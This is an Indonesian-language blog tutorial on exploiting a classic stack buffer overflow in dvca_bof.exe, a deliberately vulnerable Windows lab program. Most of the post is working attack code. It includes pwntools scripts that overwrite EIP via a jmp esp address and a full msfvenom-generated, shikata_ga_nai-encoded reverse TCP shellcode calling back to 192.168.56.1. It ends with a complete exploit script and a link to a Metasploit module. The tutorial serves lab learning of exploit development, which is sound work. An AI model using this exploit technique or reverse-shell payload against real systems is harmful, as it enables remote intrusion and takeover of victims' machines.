---
layout: post
title: "Win32 classic buffer overflow"
date: 2018-08-01 02:38:50
categories: 
    - research
tags:
    - windows
    - x86
    - stack buffer overflow
short_description: Tehnik exploitasi classic buffer overflow pada windows 32 bit
image_preview: https://avatarfiles.alphacoders.com/566/56681.jpg
---

Sebagai artikel pertama dari blog ini saya akan sedikit berbagi mengenai classic buffer overflow pada sistem Windows x86. Saya akan berasumsi kalau anda sudah lumayan mengerti mengenai [Intel x86 Assembly Language](http://www.cs.virginia.edu/~evans/cs216/guides/x86.html) dan arsitektur program berformat [PE](https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format), format executable di dalam sistem Windows. Jika belum amka sebaiknya anda membaca terlebih dahulu. Tidak perlu jago, cukup memahami istilah dan sintax akan sangat membantu dalam mencerna isi dari artikel ini.

### Persiapan

Untuk membuat lab research, beberapa tool yang saya gunakan antara lain:

1. Virtualization Software. [Virtualbox](https://www.virtualbox.org/) atau [VMWare](https://www.vmware.com).
2. Microsoft Windows 10 Pro 64 bit sebagai Guest OS. Saya memutuskan untuk menggunakan Windows 10 sebagai target machine karena saat ini OS tersebut yang banyak digunakan oleh banyak orang (khususnya Indonesia) ketimbang versi-versi sebelumnya (XP, 7, dll).
3. [Immunity Debugger](http://debugger.immunityinc.com/ID_register.py). Kita membutuhkan tool ini untuk melakukan debug (debugging) alur program. Install python 2.7 32 bit terlebih dahulu agar Immunity debugger dapat berfungsi dengan baik.
4. [Mona.py](https://github.com/corelan/mona). Mona sangat berguna dan membatu kita untuk mencari address tertentu ketika proses develop exploit. Letakkan mona.py pada direktori PyCommand di immunity debugger.
5. [Pvefindaddr.py](https://www.corelan.be/?dl_id=31). Sama seperti mona, pada beberapa kasus pvefindaddr.py akan sangat membantu.
6. [Pattern.py](https://github.com/ickerwx/pattern). script ini adalah script untuk men-generate offset sama seperti pada metasploit. Didevelop dalam bahasa pemograman python sehingga anda tidak perlu membuka metasploit.
7. [Metasploit Framework](https://www.rapid7.com/products/metasploit/download/). Framework ini akan digunakan untuk proses develop exploit.
8. [Python](https://www.python.org/downloads/) and [Pwntools package](https://github.com/Gallopsled/pwntools). Sebelum menulis module exploit dalama metasploit, kita dapat menggunakan python scripting untuk melakukan `try and error`.
9. Sebagai OS host, anda dapat menggunakan OS apa saja. Yang terpenting adalah anda dapat menginstall metasploit dan pwntools.
10. [Damn Vulnerability CWin32 Apps - Classic Buffer Overflow](https://github.com/fachrioktavian/DVCA). Saya telah membuat repository berisikan program bercelah yang akan digunakan sebagai target dalam tutorial ini.

### Jalankan program

Buka tool immunity debugger dan jalankan program dvca_bof.exe

![dvca_bof.exe]({{ site.baseurl }}/images/posts/2018/p1_1.png "dvca_bof.exe dijalankan oleh immunity debugger"){:width="600"}

### Membuat program crash

Pertama kita buat script python untuk mentrigger celah program.

```Python
#dvca_bofexploit.py
#!/usr/local/bin/python

from pwn import *

def terima(p):
 data = p.recv(1024)
 log.info("recv: " + data)
def kirim(p, payload):
 p.sendline(payload)
 log.info("send: "+ payload)

evil = "A"*2000
p = remote('192.168.56.103', 31331)
terima(p)
kirim(p, evil)
```

Jalankan script dan lihat pada debugger.

![dvca_bof.exe crash]({{ site.baseurl }}/images/posts/2018/p1_2.png "dvca_bof.exe crash"){:width="600"}

Kita lihat register EIP berisikan data `0x41414141` yaitu representasi dari karakter `AAAA` di dalam memori. EIP adalah instruction pointer, sebuah register yang menyimpan alamat dari memori yang akan dieksekusi operation code-nya. Program crash karena pada memori tidak ditemukan alamat 0x41414141.

### Mengontrol register EIP

Sekarang kita akan mencari tahu offset dimana tepatnya karakter A kita menimpa isi data dari register EIP. kita dapat menggunakan pattern.py untuk men-generate metasploit pattern. `$ pattern.py create 2000` untuk membuat 2000 karakter metasploit.

Kemudian script python menjadi:

```python
#dvca_bofexploit.py
#!/usr/local/bin/python

from pwn import *

def terima(p):
 data = p.recv(1024)
 log.info("recv: " + data)
def kirim(p, payload):
 p.sendline(payload)
 log.info("send: "+ payload)

evil = "Aa0Aa1Aa2Aa3... ...Co1Co2Co3Co4Co5Co" #shorten because it's too long
p = remote('192.168.56.103', 31331)
terima(p)
kirim(p, evil)
```

Jalankan script dan cek debugger

![EIP]({{ site.baseurl }}/images/posts/2018/p1_3.png "EIP terisi dengan pattern"){:width="600"}

Menggunakan mona, kita bisa men-track dan menemukan offset yang meng-overwrite EIP `!mona findmsp`

![mona]({{ site.baseurl }}/images/posts/2018/p1_4.png "!mona findmsp"){:width="600"}

Offset EIP berada setelah 1012 byte junk. Kita bisa menyusun payload menjadi `evil = "A"*1012 +  "BBBB"` dimana `BBBB` adalah `alamat dari sesuatu`.

Pertanyaannya adalah alamat apa yang harus kita letakkan untuk mengganti karakter BBBB? kita bisa meletakkan alamat dimana terdapat instruksi untuk lompat ke register ESP (stack pointer) karena telah kita ketahui bahwa kita dapat menulis apapuhn di dalam stack melalui celah buffer overflow. Nantinya kita akan meletakkan opcode (operation code) agar program mengeksekusinya. Gunakan mona untuk menemukan alamat tersebut, kode assembly untuk lompat ke esp adalah `jmp esp`.

Ketik `!mona jmp -r esp` pada konsol debugger.

![mona jmp]({{ site.baseurl }}/images/posts/2018/p1_5.png "!mona jmp -r esp"){:width="600"}

Kita menemukan sebuah alamat berisikan opcode yang kita inginkan. Alamat tersebut berada pada `0x133712f0` (lihat gambar). Ingat bahwa Intel x86 Assembly itu sistem berbasis little endian sehingga agar saat masuk kedalam memori alamat tidak terbalik, pada script kita harus membaliknya menjadi `\xf0\x12\x37\x13`. Dan terimakasih untuk pwntools yang telah menyediakan fungsi untuk meng-handle masalah tersebut, `p32()`.

payload kita sekarang menjadi `evil = "A"*1012 + p32(0x133712f0) + SHELLCODE`

### Shellcode

Dengan menggunakan metasploit kita generate shellcode-nya. Shellcode ridak boleh berisikan `badchar` (bad charachter). Badchar adalah karakter yang nantinya akan menghentikan program dalam mengeksekusi shellcode kita. Contoh pada program dvca_bof.exe, NULL atau `\x00` adalah badchar-nya.

Menyusun shellcode menggunakan msfvenom:

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 
LPORT=9876 -b '\x00' -e x86/shikata_ga_nai -f python
Found a database at /Users/fokt/.msf4/db, 
checking to see if it is started
Starting database at /Users/fokt/.msf4/db...success
[-] No platform was selected, 
choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: 
x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations 
of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1684 bytes
buf =  ""
buf += "\xb8\x46\x74\x2a\x7f\xd9\xd0\xd9\x74\x24\xf4\x5e\x33"
buf += "\xc9\xb1\x52\x31\x46\x12\x03\x46\x12\x83\x80\x70\xc8"
buf += "\x8a\xf0\x91\x8e\x75\x08\x62\xef\xfc\xed\x53\x2f\x9a"
buf += "\x66\xc3\x9f\xe8\x2a\xe8\x54\xbc\xde\x7b\x18\x69\xd1"
buf += "\xcc\x97\x4f\xdc\xcd\x84\xac\x7f\x4e\xd7\xe0\x5f\x6f"
buf += "\x18\xf5\x9e\xa8\x45\xf4\xf2\x61\x01\xab\xe2\x06\x5f"
buf += "\x70\x89\x55\x71\xf0\x6e\x2d\x70\xd1\x21\x25\x2b\xf1"
buf += "\xc0\xea\x47\xb8\xda\xef\x62\x72\x51\xdb\x19\x85\xb3"
buf += "\x15\xe1\x2a\xfa\x99\x10\x32\x3b\x1d\xcb\x41\x35\x5d"
buf += "\x76\x52\x82\x1f\xac\xd7\x10\x87\x27\x4f\xfc\x39\xeb"
buf += "\x16\x77\x35\x40\x5c\xdf\x5a\x57\xb1\x54\x66\xdc\x34"
buf += "\xba\xee\xa6\x12\x1e\xaa\x7d\x3a\x07\x16\xd3\x43\x57"
buf += "\xf9\x8c\xe1\x1c\x14\xd8\x9b\x7f\x71\x2d\x96\x7f\x81"
buf += "\x39\xa1\x0c\xb3\xe6\x19\x9a\xff\x6f\x84\x5d\xff\x45"
buf += "\x70\xf1\xfe\x65\x81\xd8\xc4\x32\xd1\x72\xec\x3a\xba"
buf += "\x82\x11\xef\x6d\xd2\xbd\x40\xce\x82\x7d\x31\xa6\xc8"
buf += "\x71\x6e\xd6\xf3\x5b\x07\x7d\x0e\x0c\xe8\x2a\x28\xcd"
buf += "\x80\x28\x48\xeb\xc4\xa4\xae\x99\xf4\xe0\x79\x36\x6c"
buf += "\xa9\xf1\xa7\x71\x67\x7c\xe7\xfa\x84\x81\xa6\x0a\xe0"
buf += "\x91\x5f\xfb\xbf\xcb\xf6\x04\x6a\x63\x94\x97\xf1\x73"
buf += "\xd3\x8b\xad\x24\xb4\x7a\xa4\xa0\x28\x24\x1e\xd6\xb0"
buf += "\xb0\x59\x52\x6f\x01\x67\x5b\xe2\x3d\x43\x4b\x3a\xbd"
buf += "\xcf\x3f\x92\xe8\x99\xe9\x54\x43\x68\x43\x0f\x38\x22"
buf += "\x03\xd6\x72\xf5\x55\xd7\x5e\x83\xb9\x66\x37\xd2\xc6"
buf += "\x47\xdf\xd2\xbf\xb5\x7f\x1c\x6a\x7e\x8f\x57\x36\xd7"
buf += "\x18\x3e\xa3\x65\x45\xc1\x1e\xa9\x70\x42\xaa\x52\x87"
buf += "\x5a\xdf\x57\xc3\xdc\x0c\x2a\x5c\x89\x32\x99\x5d\x98"
```

script exploit final

```python
#dvca_bofexploit.py
#!/usr/local/bin/python

from pwn import *

def terima(p):
 data = p.recv(1024)
 log.info("recv: " + data)
def kirim(p, payload):
 p.sendline(payload)
 log.info("send: "+ payload)

buf =  ""
buf += "\xb8\x46\x74\x2a\x7f\xd9\xd0\xd9\x74\x24\xf4\x5e\x33"
buf += "\xc9\xb1\x52\x31\x46\x12\x03\x46\x12\x83\x80\x70\xc8"
buf += "\x8a\xf0\x91\x8e\x75\x08\x62\xef\xfc\xed\x53\x2f\x9a"
buf += "\x66\xc3\x9f\xe8\x2a\xe8\x54\xbc\xde\x7b\x18\x69\xd1"
buf += "\xcc\x97\x4f\xdc\xcd\x84\xac\x7f\x4e\xd7\xe0\x5f\x6f"
buf += "\x18\xf5\x9e\xa8\x45\xf4\xf2\x61\x01\xab\xe2\x06\x5f"
buf += "\x70\x89\x55\x71\xf0\x6e\x2d\x70\xd1\x21\x25\x2b\xf1"
buf += "\xc0\xea\x47\xb8\xda\xef\x62\x72\x51\xdb\x19\x85\xb3"
buf += "\x15\xe1\x2a\xfa\x99\x10\x32\x3b\x1d\xcb\x41\x35\x5d"
buf += "\x76\x52\x82\x1f\xac\xd7\x10\x87\x27\x4f\xfc\x39\xeb"
buf += "\x16\x77\x35\x40\x5c\xdf\x5a\x57\xb1\x54\x66\xdc\x34"
buf += "\xba\xee\xa6\x12\x1e\xaa\x7d\x3a\x07\x16\xd3\x43\x57"
buf += "\xf9\x8c\xe1\x1c\x14\xd8\x9b\x7f\x71\x2d\x96\x7f\x81"
buf += "\x39\xa1\x0c\xb3\xe6\x19\x9a\xff\x6f\x84\x5d\xff\x45"
buf += "\x70\xf1\xfe\x65\x81\xd8\xc4\x32\xd1\x72\xec\x3a\xba"
buf += "\x82\x11\xef\x6d\xd2\xbd\x40\xce\x82\x7d\x31\xa6\xc8"
buf += "\x71\x6e\xd6\xf3\x5b\x07\x7d\x0e\x0c\xe8\x2a\x28\xcd"
buf += "\x80\x28\x48\xeb\xc4\xa4\xae\x99\xf4\xe0\x79\x36\x6c"
buf += "\xa9\xf1\xa7\x71\x67\x7c\xe7\xfa\x84\x81\xa6\x0a\xe0"
buf += "\x91\x5f\xfb\xbf\xcb\xf6\x04\x6a\x63\x94\x97\xf1\x73"
buf += "\xd3\x8b\xad\x24\xb4\x7a\xa4\xa0\x28\x24\x1e\xd6\xb0"
buf += "\xb0\x59\x52\x6f\x01\x67\x5b\xe2\x3d\x43\x4b\x3a\xbd"
buf += "\xcf\x3f\x92\xe8\x99\xe9\x54\x43\x68\x43\x0f\x38\x22"
buf += "\x03\xd6\x72\xf5\x55\xd7\x5e\x83\xb9\x66\x37\xd2\xc6"
buf += "\x47\xdf\xd2\xbf\xb5\x7f\x1c\x6a\x7e\x8f\x57\x36\xd7"
buf += "\x18\x3e\xa3\x65\x45\xc1\x1e\xa9\x70\x42\xaa\x52\x87"
buf += "\x5a\xdf\x57\xc3\xdc\x0c\x2a\x5c\x89\x32\x99\x5d\x98"

jesp = 0x133712f0

evil = "A"*1012 + p32(jesp) + "\x90"*10 + buf
p = remote('192.168.56.103', 31331)
terima(p)
kirim(p, evil)
```

`\x90` adalah opcode dari NOP, artinya No Operation sampai menemukan opcode lain. Setelah menyusun script exploit meaning No Operation until find other opcode. Setelah exploit selesai, jalankan msfconsole.

![msfconsole]({{ site.baseurl }}/images/posts/2018/p1_6.png "msfconsole"){:width="600"}

Jalankan script eksploit dan kita mendapatkan shell.

![shell]({{ site.baseurl }}/images/posts/2018/p1_7.png "shell"){:width="600"}

### Metasploit module

Untuk membuat script exploit menjadi portabel, kita bisa membuatnya menjadi modul metasploit sehingga metasploit dapat mengeksploitasinya secara otomatis. Saya telah membuat modul tersebut yang dapat anda lihat pada link berikut.

[exploit/windows/DVCA/cbof.rb](https://github.com/fachrioktavian/DVCA/blob/master/ClassicBufferOverflow/cbof.rb)

Letakkan script tersebut pada direktori `$MSF_PATH/embedded/framework/modules/exploit/windows/DVCA/` (path relatif tergantung instalasi).

Dan gunakan modul tersebut pada metasploit

![msfconsole]({{ site.baseurl }}/images/posts/2018/p1_8.png "modul exploit msfconsole")